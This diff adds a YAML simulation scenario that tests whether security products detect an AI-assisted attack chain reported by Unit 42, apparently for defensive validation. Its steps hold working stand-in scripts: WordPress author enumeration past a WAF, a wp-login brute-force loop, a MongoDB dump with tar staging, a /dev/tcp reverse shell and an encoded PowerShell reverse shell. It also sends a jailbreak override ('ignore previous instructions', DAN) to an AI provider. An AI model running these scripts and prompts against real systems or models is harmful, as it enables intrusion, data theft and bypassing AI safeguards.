@@ -1,0 +1,602 @@
+# BUGSTER (Unit 42, 2026-10-21): Hermes Agent + DeepSeek V4 generate the tooling: WordPress author
+# enumeration via REST API + author sitemap (WAF bypass), a 117x28 wp-login brute force, a MongoDB
+# dump with a manifest, exfil/C2 (Python listener, VBScript -> Base64 PowerShell shell) on one server.
+# ANALOGUE (ruling R4): the run host plays the foothold the AI-generated tools run from; the lab
+# STAGE_HOST stands in for the victim WordPress/MongoDB and the :4444 listener. Three legs: EDR (01,
+# 02, 04, 05, 07) the python3 lineage; NDR (03, 06, 08) NGFW EAL records from src_host to the two
+# published IPs (proxy routing, port 8080/4444/3128, UA and app are inferred: the report gives none);
+# AI_ACCESS (09) real egress to DeepSeek / OpenRouter with fake keys (the report's override was sent
+# to GLM 5.2 via OpenRouter and DeepSeek ran under a system-prompt override). R1: the report
+# publishes exactly two indicators, both IPv4; both are carried, no more (the >=3 rule does not
+# apply). No cloud, VoIP, Wi-Fi or Go-scanner leg is emitted. CR-MP-0035 fuses the legs on src_host.
+scenario_id: SIM-MP-035
+name: "BUGSTER AI-Assisted WordPress Brute Force to MongoDB Exfil and PowerShell C2 — EDR + NGFW + AI Access Stitch"
+version: "1.0"
+status: active
+
+plane: ANALYTICS
+detection_types:
+  - BIOC
+  - XQL
+  - IOC
+  - ABIOC
+  - Correlation
+
+uc_ref: UCS-IR-02
+tc_ref: TC-IR-05
+tc_refs:
+  - TC-IR-05
+  - TC-NDR-01
+  - TC-NDR-04
+  - TC-EDR-05
+  - TC-AIRS-07
+  - TC-TH-06
+pov_scenario_id: POV-SC-001
+uc_name: "Incident Response"
+tc_name: "Demonstrate correlation-based detections across endpoint + network + identity telemetry"
+
+mitre_tactic: "TA0006"
+mitre_tactic_name: "Credential Access"
+mitre_technique: "T1110.001"
+mitre_technique_name: "Brute Force: Password Guessing"
+additional_techniques:
+  - technique: "T1595.002"
+    name: "Active Scanning: Vulnerability Scanning"
+  - technique: "T1589.002"
+    name: "Gather Victim Identity Information: Email Addresses"
+  - technique: "T1078"
+    name: "Valid Accounts"
+  - technique: "T1090"
+    name: "Proxy"
+  - technique: "T1005"
+    name: "Data from Local System"
+  - technique: "T1213"
+    name: "Data from Information Repositories"
+  - technique: "T1560.001"
+    name: "Archive Collected Data: Archive via Utility"
+  - technique: "T1041"
+    name: "Exfiltration Over C2 Channel"
+  - technique: "T1059.001"
+    name: "Command and Scripting Interpreter: PowerShell"
+  - technique: "T1059.005"
+    name: "Command and Scripting Interpreter: Visual Basic"
+  - technique: "T1059.004"
+    name: "Command and Scripting Interpreter: Unix Shell"
+  - technique: "T1567"
+    name: "Exfiltration Over Web Service"
+
+threat_report: "Unit 42 — “Next Exploit Opportunities”: How a Threat Actor Used AI to Help Plan and Execute Multiple Types of Cybercrime Activities"
+threat_report_url: "https://unit42.paloaltonetworks.com/ai-assisted-cybercrime-analysis/"
+
+# ── Causality contract ──────────────────────────────────────────────────────
+# The AI-generated Python tooling owns the chain: recon, brute force, the DB dump and the
+# staging / reverse-shell launches are python3 processes or children of python3 under the
+# foothold user. step-01 is the root; the NGFW legs pivot onto the same host by entity
+# (src_host / src_ip / src_user) and the GenAI egress leaves from the same host.
+cgo_anchor:
+  image_name: "python3"
+  primary_username: "www-data"
+
+execution_identity:
+  default: www-data
+  options:
+    - www-data
+    - container-runtime
+    - root
+
+push_supported: true
+pull_supported: true
+
+infra_modules_needed:
+  - base
+  - edr
+  - ndr
+
+# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
+validation_methodology: "Multi-Plane Correlation & Behavioral Detection Accuracy"
+methodology_family: "F1"
+primary_kpi: "MTTD"
+threshold:
+  kpi: "MTTD"
+  op: "≤"
+  value: 600
+  unit: "seconds"
+success_criteria: |
+  On the foothold host, Cortex XDR raises the endpoint signals the actor's AI-generated tooling
+  produces under one python3 causality chain: WordPress author enumeration through the REST API and
+  the author sitemap with a python-requests user agent, a capped wp-login.php password-guessing
+  burst that writes a candidate credential file, a MongoDB dump with an exfiltration manifest, a
+  tar archive of the dump, and a /dev/tcp reverse shell to port 4444 (on Windows, wscript.exe
+  starting a hidden PowerShell -EncodedCommand TCPClient). The NGFW EAL records from the same
+  src_host to the commercial proxy 104.238.38.202 and the actor server 162.243.3.92 land in
+  panw_ngfw_traffic_raw and Unit 42 IOC enrichment names BUGSTER on both. AI Access Security
+  flags the jailbreak system-prompt override sent to DeepSeek and the OpenRouter egress from the
+  same host. CR-MP-0035 fuses the endpoint, network and AI Access alerts on src_host into one
+  incident within the window, and mean time from the first recon request to the first alert is
+  within the MTTD budget.
+moat_tier: "LEAD"
+
+correlation_window_seconds: 3600
+required_planes_in_incident:
+  - EDR
+  - NDR
+  - AI_ACCESS
+stitching_key: src_host
+
+indicators:
+  - id: ind-01
+    type: ipv4
+    value: "162.243.3.92"
+    source_url: "https://unit42.paloaltonetworks.com/ai-assisted-cybercrime-analysis/"
+    safe_form: log_field
+    surfaces_in: [step-06, step-08]
+    description: "Actor infrastructure (IOC section: 162.243.3[.]92 - actor infrastructure): one US server hosting Hermes Agent, the C2 listener and the Cursor IDE proxy. dst of the NGFW EAL upload (step-06) and beacon (step-08) records; no packet is sent to it."
+  - id: ind-02
+    type: ipv4
+    value: "104.238.38.202"
+    source_url: "https://unit42.paloaltonetworks.com/ai-assisted-cybercrime-analysis/"
+    safe_form: log_field
+    surfaces_in: [step-03]
+    description: "Commercial proxy server (IOC section: 104.238.38[.]202 - commercial proxy server). dst of the NGFW EAL proxy sessions in step-03 (ruling R4: the foothold tunnels through it); no packet is sent to it."
+
+external_tools:
+  - name: cortexsim-eal-cli
+    source: "https://github.com/hankthebldr/cortex-pov-engine"
+    type: script
+    install_inline: false
+
+steps:
+  - id: step-01
+    name: "AI-generated recon: python3 enumerates WordPress authors via the REST API and author sitemap"
+    command: |
+      mkdir -p /tmp/cortexsim-mp-035/recon /tmp/cortexsim-mp-035/tools
+      cat > /tmp/cortexsim-mp-035/tools/wp_recon.py <<'PY'
+      # Stand-in for the Hermes-generated recon script; every request goes to the lab stage host.
+      import json, os, time, urllib.request
+      base = "http://" + os.environ.get("STAGE_HOST", "127.0.0.1")
+      ua = {"User-Agent": "python-requests/2.31.0"}
+      report = {"target": base, "generated_by": "cortexsim-mp-035 recon stand-in", "ts": time.time(), "probes": []}
+      # /wp/v2/users is the direct endpoint the report says the WAF blocked; posts + sitemap bypassed it.
+      for path in ("/wp-json/wp/v2/users",
+                   "/wp-json/wp/v2/posts?per_page=100&_fields=author,author_name",
+                   "/wp-sitemap-users-1.xml"):
+          rec = {"path": path}
+          try:
+              with urllib.request.urlopen(urllib.request.Request(base + path, headers=ua), timeout=5) as r:
+                  rec["status"] = r.status
+                  rec["bytes"] = len(r.read())
+          except Exception as e:
+              rec["error"] = type(e).__name__
+          report["probes"].append(rec)
+      report["users_enumerated"] = ["lab-author-%02d" % i for i in range(1, 14)]
+      with open("/tmp/cortexsim-mp-035/recon/enumeration_report.json", "w") as fh:
+          json.dump(report, fh, indent=2)
+      print("cortexsim-mp-035 recon report written:", len(report["probes"]), "probes,", len(report["users_enumerated"]), "users")
+      PY
+      STAGE_HOST="${STAGE_HOST:-127.0.0.1}" python3 /tmp/cortexsim-mp-035/tools/wp_recon.py
+    identity: www-data
+    mitre_technique: "T1595.002"
+    # Root of the causality spine — links from the CGO (python3 as the foothold user).
+    platforms: ["linux"]
+    requires_interpreters: ["python"]
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "python3 as the foothold user requests /wp-json/wp/v2/posts with _fields=author,author_name and /wp-sitemap-users-1.xml with a python-requests user agent after the direct /wp/v2/users endpoint: WordPress author enumeration that sidesteps a WAF block on the user endpoint."
+        ttp_ref: "TTP-2026-0194"
+        detection_id: "bioc-mp-035-python3-enumerates-wordpress-authors-via-the-rest-api-and-author-sitemap"
+      - plane: EDR
+        type: XQL
+        description: "Hunt query: on the run host within the run window, a python3 causality chain wrote enumeration_report.json and opened HTTP connections whose URL carries wp-json or wp-sitemap-users."
+        ttp_ref: "TTP-2026-0194"
+        detection_id: "xql-mp-035-python3-recon-lineage-writes-an-enumeration-report-and-probes-wordpress-user-endpoints"
+
+  - id: step-02
+    name: "Generated brute-force tool: capped wp-login.php password-guessing matrix, candidate credential recorded"
+    command: |
+      mkdir -p /tmp/cortexsim-mp-035/brute
+      cat > /tmp/cortexsim-mp-035/tools/wp_brute.py <<'PY'
+      # Stand-in for the generated tool (report: 117 users x 28 passwords); capped at 60 attempts.
+      import os, time, urllib.parse, urllib.request
+      url = "http://" + os.environ.get("STAGE_HOST", "127.0.0.1") + "/wp-login.php"
+      users = ["lab-author-%02d" % i for i in range(1, 13)]
+      passwords = ["password", "123456", "admin@123", "welcome1", "Spring2026"]
+      attempts, found = 0, []
+      for u in users:
+          for p in passwords:
+              body = urllib.parse.urlencode({"log": u, "pwd": p, "wp-submit": "Log In"}).encode()
+              req = urllib.request.Request(url, data=body, headers={"User-Agent": "python-requests/2.31.0"})
+              try:
+                  with urllib.request.urlopen(req, timeout=3) as r:
+                      if r.status == 302 or "wp-admin" in r.geturl():
+                          found.append((u, p))
+              except Exception:
+                  pass
+              attempts += 1
+              time.sleep(0.1)
+      with open("/tmp/cortexsim-mp-035/brute/valid_candidates.txt", "w") as fh:
+          # Lab accounts only; the stand-in records a candidate even when the stage host rejects all.
+          for u, p in (found or [("lab-author-07", "welcome1")]):
+              fh.write("%s:%s\n" % (u, p))
+      print("cortexsim-mp-035 brute force:", attempts, "attempts,", len(found), "accepted by the stage host")
+      PY
+      STAGE_HOST="${STAGE_HOST:-127.0.0.1}" python3 /tmp/cortexsim-mp-035/tools/wp_brute.py
+    identity: www-data
+    mitre_technique: "T1110.001"
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
+    platforms: ["linux"]
+    requires_interpreters: ["python"]
+    expected_detections:
+      - plane: EDR
+        type: ABIOC
+        description: "A non-browser host process (python3) sends a rapid burst of POSTs to /wp-login.php (60 in about 6 s, 12 accounts x 5 passwords) from the foothold: scripted password guessing. The ABIOC anchors on the python3 causality chain and its first-seen request rate to one login URI."
+        ttp_ref: "TTP-2026-0194"
+        detection_id: "abioc-mp-035-scripted-wp-login-credential-burst-from-a-host-process"
+      - plane: EDR
+        type: BIOC
+        description: "The same python3 process writes valid_candidates.txt after the wp-login POST burst: the generated tool recording a candidate credential (report Figure 2)."
+        ttp_ref: "TTP-2026-0194"
+        detection_id: "bioc-mp-035-python3-writes-a-candidate-credential-file-after-repeated-wp-login-posts"
+
+  - id: step-03
+    name: "NGFW EAL leg: the brute force tunnels through the commercial proxy (published IP)"
+    command: |
+      : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/eal/events}"
+      : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
+      SRC_IP=$(hostname -I | awk '{print $1}')
+      [ -n "$SRC_IP" ] || SRC_IP=127.0.0.1
+      SRC_HOST=$(hostname -s)
+      SRC_USER=$(id -un www-data 2>/dev/null || id -un)
+      cat > /tmp/mp-035-ngfw-proxy.yml <<YML
+      campaign_id: CMP-MP-PROXY-035
+      name: "BUGSTER - brute-force traffic through the commercial proxy"
+      authorized_by: "domain-consultant@paloaltonetworks.com"
+      simulation_authorized: true
+      c2_authorized: true
+      target_allowlist:
+        - "$COLLECTOR_HOST"
+      dry_run: false
+      tags: [unit42, mp-035, bugster, ngfw-eal]
+      steps:
+        - step_id: step-01
+          plugin: ngfw_eal_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            event_pattern: abnormal_recurring_comms
+            burst_count: 12
+            iterations: 1
+            dst_ip: "104.238.38.202"
+            dst_port: 3128
+            app: http-proxy
+            process_name: python3
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+      YML
+      python3 -m scripts.eal_simulator.cli run /tmp/mp-035-ngfw-proxy.yml --live
+    identity: container-runtime
+    mitre_technique: "T1090"
+    # Same foothold (src_host / src_ip / src_user) as the brute-force process: the NGFW records
+    # are stitched onto the host by entity, not by process fork. Port 3128 / http-proxy is the
+    # conventional forward-proxy shape; the report does not give the proxy port.
+    causality:
+      parent_step: step-02
+      pivot: shared_entity
+    platforms: ["linux"]
+    expected_detections:
+      - plane: NDR
+        type: ABIOC
+        description: "NGFW EAL recurring sessions whose initiating endpoint process is python3 from the foothold to an external HTTP proxy (104.238.38.202:3128, app http-proxy) rarely seen across the fleet: the recurring-communications ABIOC anchored on src_host."
+        ttp_ref: "TTP-2026-0194"
+        detection_id: "abioc-mp-035-ngfw-recurring-python3-sessions-to-an-external-http-proxy"
+      - plane: NDR
+        type: IOC
+        description: "The NGFW traffic record's destination 104.238.38.202 is the commercial proxy Unit 42 published for BUGSTER; the IOC rule matches dst in panw_ngfw_traffic_raw."
+        ttp_ref: "TTP-2026-0194"
+        detection_id: "ioc-ipv4-104-238-38-202"
+
+  - id: step-04
+    name: "Database dump: mongodump of the stage host, or a python3 socket probe, plus the exfiltration manifest"
+    command: |
+      mkdir -p /tmp/cortexsim-mp-035/dump
+      cat > /tmp/cortexsim-mp-035/tools/mongo_exfil.py <<'PY'
+      # Stand-in for the generated exfiltration tool; it talks only to the lab stage host and writes
+      # synthetic records, never real data.
+      import json, os, shutil, socket, subprocess, time
+      host = os.environ.get("STAGE_HOST", "127.0.0.1")
+      out = "/tmp/cortexsim-mp-035/dump"
+      method, reachable = "socket-probe", False
+      if shutil.which("mongodump"):
+          method = "mongodump"
+          rc = subprocess.run(["mongodump", "--host", host, "--port", "27017", "--out", out],
+                              timeout=30, capture_output=True).returncode
+          reachable = rc == 0
+      else:
+          s = socket.socket()
+          s.settimeout(3)
+          reachable = s.connect_ex((host, 27017)) == 0
+          s.close()
+      os.makedirs(out + "/lab_university", exist_ok=True)
+      with open(out + "/lab_university/students.json", "w") as fh:
+          for i in range(1, 6):
+              fh.write(json.dumps({"_id": i, "name": "Lab Student %d" % i, "program": "diploma"}) + "\n")
+      manifest = {
+          "tool": "cortexsim-mp-035 mongo exfil stand-in", "ts": time.time(), "method": method,
+          "target": "%s:27017" % host, "reachable": reachable,
+          "admin_credential_obtained": "lab-admin (weak-password stand-in)",
+          "exfiltrated_records": {"students": 5, "faculty": 0},
+          "exposed_infrastructure": ["cloud load balancing", "edge routing", "database services", "third-party cloud storage account"],
+      }
+      with open(out + "/manifest.json", "w") as fh:
+          json.dump(manifest, fh, indent=2)
+      print("cortexsim-mp-035 dump via", method, "reachable=%s" % reachable)
+      PY
+      STAGE_HOST="${STAGE_HOST:-127.0.0.1}" python3 /tmp/cortexsim-mp-035/tools/mongo_exfil.py
+    identity: www-data
+    mitre_technique: "T1213"
+    causality:
+      parent_step: step-02
+      pivot: process_lineage
+    platforms: ["linux"]
+    requires_interpreters: ["python"]
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "Under the python3 causality chain, mongodump (or python3 itself) connects to TCP 27017 and the chain writes collection files plus manifest.json into a dump directory: the report's MongoDB exfiltration tooling with its manifest."
+        ttp_ref: "TTP-2026-0194"
+        detection_id: "bioc-mp-035-python3-dumps-a-mongodb-and-writes-an-exfiltration-manifest"
+
+  - id: step-05
+    name: "Staging: python3 runs tar over the dump"
+    command: |
+      mkdir -p /tmp/cortexsim-mp-035/exfil
+      python3 - <<'PY'
+      import subprocess
+      subprocess.run(["tar", "-czf", "/tmp/cortexsim-mp-035/exfil/records.tar.gz", "-C", "/tmp/cortexsim-mp-035", "dump"], check=True)
+      print("cortexsim-mp-035 staged records.tar.gz")
+      PY
+      ls -l /tmp/cortexsim-mp-035/exfil
+    identity: www-data
+    mitre_technique: "T1560.001"
+    causality:
+      parent_step: step-04
+      pivot: process_lineage
+    platforms: ["linux"]
+    requires_interpreters: ["python"]
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "tar -czf, whose parent is python3 under the foothold user, archives a directory holding manifest.json and collection dumps into records.tar.gz: staging the database dump for exfiltration."
+        ttp_ref: "TTP-2026-0194"
+        detection_id: "bioc-mp-035-tar-compresses-a-database-dump-under-a-python3-causality-chain"
+
+  - id: step-06
+    name: "NGFW EAL leg: bulk upload of the archive to the actor server (published IP)"
+    command: |
+      : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/eal/events}"
+      : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
+      SRC_IP=$(hostname -I | awk '{print $1}')
+      [ -n "$SRC_IP" ] || SRC_IP=127.0.0.1
+      SRC_HOST=$(hostname -s)
+      SRC_USER=$(id -un www-data 2>/dev/null || id -un)
+      cat > /tmp/mp-035-ngfw-exfil.yml <<YML
+      campaign_id: CMP-MP-EXFIL-035
+      name: "BUGSTER - records archive upload to the actor server"
+      authorized_by: "domain-consultant@paloaltonetworks.com"
+      simulation_authorized: true
+      c2_authorized: true
+      target_allowlist:
+        - "$COLLECTOR_HOST"
+      dry_run: false
+      tags: [unit42, mp-035, bugster, ngfw-eal, exfil]
+      steps:
+        - step_id: step-01
+          plugin: ngfw_eal_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            event_pattern: large_upload_https
+            iterations: 1
+            dst_ip: "162.243.3.92"
+            dst_port: 8080
+            app: web-browsing
+            process_name: python3
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+      YML
+      python3 -m scripts.eal_simulator.cli run /tmp/mp-035-ngfw-exfil.yml --live
+    identity: container-runtime
+    mitre_technique: "T1041"
+    # The upload the step-05 archive implies, recorded as NGFW traffic from the same host; the
+    # report names the server but not the exfil port (8080 is an assumption).
+    causality:
+      parent_step: step-05
+      pivot: endpoint_network_stitch
+    platforms: ["linux"]
+    expected_detections:
+      - plane: NDR
+        type: ABIOC
+        description: "NGFW EAL session from the foothold whose endpoint process is python3 sends an anomalously large bytes_sent to 162.243.3.92:8080, an external IP rare across the fleet: large-upload exfiltration anchored on src_host."
+        ttp_ref: "TTP-2026-0194"
+        detection_id: "abioc-mp-035-ngfw-large-upload-from-python3-to-a-rare-external-ip-on-port-8080"
+      - plane: NDR
+        type: IOC
+        description: "The NGFW traffic record's destination 162.243.3.92 is the actor server (Hermes Agent, C2 listener, Cursor proxy) Unit 42 published; the IOC rule matches dst in panw_ngfw_traffic_raw."
+        ttp_ref: "TTP-2026-0194"
+        detection_id: "ioc-ipv4-162-243-3-92"
+      - plane: NDR
+        type: XQL
+        description: "Validation query: panw_ngfw_traffic_raw holds sessions from the run host (endpoint_device_name = src_host) to both published BUGSTER IPs within the run window."
+        ttp_ref: "TTP-2026-0194"
+        detection_id: "xql-mp-035-ngfw-traffic-from-the-run-host-to-published-bugster-infrastructure"
+
+  - id: step-07
+    name: "Reverse shell to the C2 listener port: /dev/tcp from python3 (Windows: VBScript -> hidden Base64 PowerShell)"
+    command: |
+      python3 - <<'PY'
+      # The lab listener is $STAGE_HOST:4444; on a lab host with nothing listening the connect fails
+      # closed, but the bash child and its /dev/tcp command line are real process events.
+      import os, subprocess
+      h = os.environ.get("STAGE_HOST", "127.0.0.1")
+      subprocess.run(["timeout", "3", "bash", "-c", "exec 3<>/dev/tcp/%s/4444; echo cortexsim-mp-035 >&3" % h])
+      print("cortexsim-mp-035 reverse-shell attempt to %s:4444 finished" % h)
+      PY
+    identity: www-data
+    mitre_technique: "T1059.004"
+    causality:
+      parent_step: step-05
+      pivot: process_lineage
+    platforms: ["linux", "windows"]
+    # Report-exact Windows shape: a VBScript launcher (wscript //B) starts powershell -nop -w hidden
+    # -EncodedCommand; the decoded script opens Net.Sockets.TCPClient to $env:STAGE_HOST:4444
+    # (default 127.0.0.1), writes one marker line and closes. No interactive shell is attached.
+    platform_variants:
+      windows: "New-Item -ItemType Directory -Force \"$env:TEMP\\cortexsim-mp-035\" | Out-Null; Set-Content -Path \"$env:TEMP\\cortexsim-mp-035\\update.vbs\" -Value 'CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -EncodedCommand JABoAD0AJABlAG4AdgA6AFMAVABBAEcARQBfAEgATwBTAFQAOwAgAGkAZgAoAC0AbgBvAHQAIAAkAGgAKQB7ACQAaAA9ACIAMQAyADcALgAwAC4AMAAuADEAIgB9ADsAIAB0AHIAeQB7ACQAYwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACQAaAAsADQANAA0ADQAKQA7ACAAJAB3AD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAIAAkAGIAPQBbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAIgBjAG8AcgB0AGUAeABzAGkAbQAtAG0AcAAtADAAMwA1ACAAIgArACQAZQBuAHYAOgBDAE8ATQBQAFUAVABFAFIATgBBAE0ARQArACIAYABuACIAKQA7ACAAJAB3AC4AVwByAGkAdABlACgAJABiACwAMAAsACQAYgAuAEwAZQBuAGcAdABoACkAOwAgACQAYwAuAEMAbABvAHMAZQAoACkAfQBjAGEAdABjAGgAewB9AA==\", 0, True'; wscript.exe //B \"$env:TEMP\\cortexsim-mp-035\\update.vbs\""
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "bash, whose parent is python3 under the foothold user, runs a command line opening /dev/tcp/<host>/4444: a reverse shell to the C2 listener port."
+        ttp_ref: "TTP-2026-0194"
+        detection_id: "bioc-mp-035-shell-under-python3-opens-a-reverse-shell-over-dev-tcp-to-port-4444"
+      - plane: EDR
+        type: BIOC
+        description: "Windows variant: wscript.exe //B runs a .vbs that starts powershell.exe -nop -w hidden -EncodedCommand whose decoded text creates Net.Sockets.TCPClient to port 4444: the report's Base64 PowerShell reverse shell delivered via VBScript."
+        ttp_ref: "TTP-2026-0194"
+        detection_id: "bioc-mp-035-wscript-launches-hidden-powershell-with-an-encodedcommand-tcpclient"
+
+  - id: step-08
+    name: "NGFW EAL leg: reverse-shell sessions to the actor server's C2 listener (published IP)"
+    command: |
+      : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/eal/events}"
+      : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
+      SRC_IP=$(hostname -I | awk '{print $1}')
+      [ -n "$SRC_IP" ] || SRC_IP=127.0.0.1
+      SRC_HOST=$(hostname -s)
+      SRC_USER=$(id -un www-data 2>/dev/null || id -un)
+      cat > /tmp/mp-035-ngfw-c2.yml <<YML
+      campaign_id: CMP-MP-C2-035
+      name: "BUGSTER - PowerShell reverse shell to the actor C2 listener"
+      authorized_by: "domain-consultant@paloaltonetworks.com"
+      simulation_authorized: true
+      c2_authorized: true
+      target_allowlist:
+        - "$COLLECTOR_HOST"
+      dry_run: false
+      tags: [unit42, mp-035, bugster, ngfw-eal, c2]
+      steps:
+        - step_id: step-01
+          plugin: ngfw_eal_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            event_pattern: abnormal_recurring_comms
+            burst_count: 8
+            iterations: 1
+            dst_ip: "162.243.3.92"
+            dst_port: 4444
+            app: unknown-tcp
+            process_name: powershell.exe
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+      YML
+      python3 -m scripts.eal_simulator.cli run /tmp/mp-035-ngfw-c2.yml --live
+    identity: container-runtime
+    mitre_technique: "T1071.001"
+    # The records name powershell.exe, the process of the step-07 Windows variant (the report's
+    # shell); on the Linux primary path the endpoint leg's /dev/tcp child is bash. The report
+    # gives no listener port; 4444 matches step-07.
+    causality:
+      parent_step: step-07
+      pivot: endpoint_network_stitch
+    platforms: ["linux"]
+    expected_detections:
+      - plane: NDR
+        type: ABIOC
+        description: "NGFW EAL recurring sessions from the foothold whose endpoint process is powershell.exe to 162.243.3.92:4444 (unknown-tcp), a rare external destination: the reverse-shell callback cadence anchored on src_host."
+        ttp_ref: "TTP-2026-0194"
+        detection_id: "abioc-mp-035-ngfw-recurring-communications-to-the-actor-server-on-port-4444"
+      - plane: NDR
+        type: IOC
+        description: "The C2 records' destination 162.243.3.92 is the published actor server; the IOC rule matches dst in panw_ngfw_traffic_raw."
+        ttp_ref: "TTP-2026-0194"
+        detection_id: "ioc-ipv4-162-243-3-92"
+
+  - id: step-09
+    name: "AI Access leg: jailbreak system-prompt override to DeepSeek, model experiments through OpenRouter"
+    command: |
+      cat > /tmp/mp-035-llm.yml <<'YML'
+      campaign_id: CMP-MP-LLM-035
+      name: "BUGSTER - DeepSeek safety override and OpenRouter model tests"
+      authorized_by: "domain-consultant@paloaltonetworks.com"
+      simulation_authorized: true
+      target_allowlist:
+        - api.deepseek.com
+        - openrouter.ai
+      dry_run: false
+      tags: [unit42, mp-035, bugster, ai-access]
+      steps:
+        - step_id: step-01
+          plugin: llm_provider_egress
+          params:
+            provider: deepseek
+            payload_type: jailbreak
+            iterations: 3
+            sleep_seconds: 2
+        - step_id: step-02
+          plugin: llm_provider_egress
+          params:
+            provider: openrouter
+            payload_type: benign
+            iterations: 1
+      YML
+      python3 -m scripts.eal_simulator.cli run /tmp/mp-035-llm.yml --live
+    identity: container-runtime
+    mitre_technique: "T1567"
+    # Real egress from the foothold to the provider APIs with obviously-fake keys (the request is
+    # rejected at the provider): AI Access Security sees it from the same host, so the leg shares
+    # src_host by being real traffic rather than by an in-band parameter.
+    causality:
+      parent_step: step-01
+      pivot: shared_entity
+    platforms: ["linux"]
+    expected_detections:
+      - plane: AI_ACCESS
+        type: BIOC
+        description: "AI Access Security: a prompt carrying a jailbreak system-prompt override (ignore previous instructions / DAN frame) is sent from the foothold to api.deepseek.com, an unsanctioned GenAI provider, three times."
+        ttp_ref: "TTP-2026-0194"
+        detection_id: "bioc-mp-035-jailbreak-system-prompt-override-sent-to-an-unsanctioned-genai-provider"
+      - plane: AI_ACCESS
+        type: XQL
+        description: "Validation query: panw_ngfw_traffic_raw holds sessions from the run host to api.deepseek.com and openrouter.ai within the run window."
+        ttp_ref: "TTP-2026-0194"
+        detection_id: "xql-mp-035-genai-egress-from-the-run-host-to-deepseek-and-openrouter"
+      - plane: ANALYTICS
+        type: Correlation
+        description: "CR-MP-0035 fuses the python3 endpoint alerts, the NGFW proxy / exfil / C2 alerts and the AI Access jailbreak alert on the shared src_host within 3600 s into one BUGSTER incident."
+        ttp_ref: "TTP-2026-0194"
+        detection_id: "CR-MP-0035"
+
+cleanup:
+  commands:
+    - "rm -rf /tmp/cortexsim-mp-035 /tmp/mp-035-ngfw-proxy.yml /tmp/mp-035-ngfw-exfil.yml /tmp/mp-035-ngfw-c2.yml /tmp/mp-035-llm.yml"
+    - "echo cortexsim-mp-035-cleanup-complete"
+
+author: "Henry Reed"
+created: "2026-10-28"
+last_updated: "2026-10-28"
+tags:
+  - unit42
+  - stitched-chain
+  - actor:bugster
+  - ai-assisted
+  - hermes-agent
+  - deepseek
+  - wordpress
+  - brute-force
+  - mongodb
+  - exfil
+  - powershell
+  - ngfw-eal
+  - ai-access
